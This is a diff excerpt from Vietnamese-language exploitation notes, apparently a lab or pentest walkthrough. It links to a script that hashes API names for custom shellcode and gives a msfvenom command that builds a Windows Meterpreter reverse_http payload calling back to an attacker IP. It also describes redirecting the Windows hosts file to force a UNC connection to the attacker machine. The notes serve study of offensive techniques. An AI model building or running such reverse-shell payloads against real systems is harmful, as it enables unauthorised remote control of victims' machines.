@@ -6,9 +6,9 @@ Lưu ý chụp lại các đoạn có IP của máy Debug sau khi đã khai thá
 Để load API thì tính hash: \
 [Code tính hash tên các API](https://github.com/10u15hack1ng/x86Win-Notes/blob/main/Custom%20Shellcode/getAPIhash.py)
 
-Để sinh payload bằng metasploit trên máy tấn công:
+Để sinh payload bằng metasploit trên máy tấn công tại thư mục /home/kali:
 ```
-$ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
+msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
 ```
 
 Thay đổi file hosts trên máy Windows để tạo kết nối UNC sang máy tấn công.  
